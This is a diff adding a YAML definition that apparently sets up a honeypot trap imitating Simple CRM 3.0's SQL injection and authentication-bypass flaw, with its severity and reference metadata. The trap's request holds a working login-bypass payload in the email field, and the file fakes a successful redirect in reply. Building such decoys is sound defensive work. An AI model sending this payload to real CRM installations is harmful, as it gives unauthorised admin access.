@@ -1,0 +1,26 @@
+id: simple-crm-sql-injection
+info:
+  name: Simple CRM 3.0 SQL Injection and Authentication Bypass
+  author: geeknik
+  description: Simple CRM 3.0 is susceptible to SQL injection and authentication bypass
+    vulnerabilities.
+  severity: critical
+  reference:
+  - https://packetstormsecurity.com/files/163254/simplecrm30-sql.txt
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+  tags: packetstorm,sqli,simplecrm,auth-bypass,injection
+traps:
+- request:
+    method: POST
+    path: /scrm/crm/admin
+    headers: null
+    body: email='+or+2>1+--+&password=&login=
+  response:
+    status_code: 200
+    headers: {}
+    body: <script>window.location.href='home.php'</script>
